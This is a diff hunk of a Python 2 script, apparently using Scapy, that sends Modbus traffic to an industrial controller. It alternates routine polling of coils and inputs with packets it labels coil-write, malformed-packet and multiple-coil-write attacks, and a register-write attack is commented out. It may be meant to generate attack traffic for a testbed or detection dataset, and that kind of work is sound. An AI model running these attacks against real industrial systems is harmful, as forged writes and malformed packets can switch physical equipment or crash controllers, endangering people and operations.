@@ -88,7 +88,47 @@ time.sleep(0.5)
 #print "Sent Register Write Attack"
 #time.sleep(0.5)
 
-for i in range(0,5):
+for i in range(0,5): # 20
+    stream.sr(read_coils)
+    stream.sr(read_discrete_inputs)
+    time.sleep(0.5)
+
+#ATTACK 1 - 4 packs
+stream.sr(write_coil_low)
+time.sleep(1)
+stream.sr(write_coil_high)
+print "Sent Coil Write Attack"
+time.sleep(0.5)
+
+for i in range(0,5): #20
+    stream.sr(read_coils)
+    stream.sr(read_discrete_inputs)
+    time.sleep(0.5)
+
+#Send the desired packets # 2 packs
+stream.sr(errorpacket)
+print "Sent Coil Malformed Packet Attack"
+time.sleep(0.5)
+
+for i in range(0,5): #20
+    stream.sr(read_coils)
+    stream.sr(read_discrete_inputs)
+    time.sleep(0.5)
+
+# 4 packs
+stream.sr(write_multiple_coils_low)
+time.sleep(1)
+stream.sr(write_multiple_coils_high)
+print "Sent Multiple Coil Write Attack"
+time.sleep(0.5)
+
+#stream.sr(write_register_high)
+#time.sleep(1)
+#stream.sr(write_register_low)
+#print "Sent Register Write Attack"
+#time.sleep(0.5)
+
+for i in range(0,5): # 20
     stream.sr(read_coils)
     stream.sr(read_discrete_inputs)
     time.sleep(0.5)
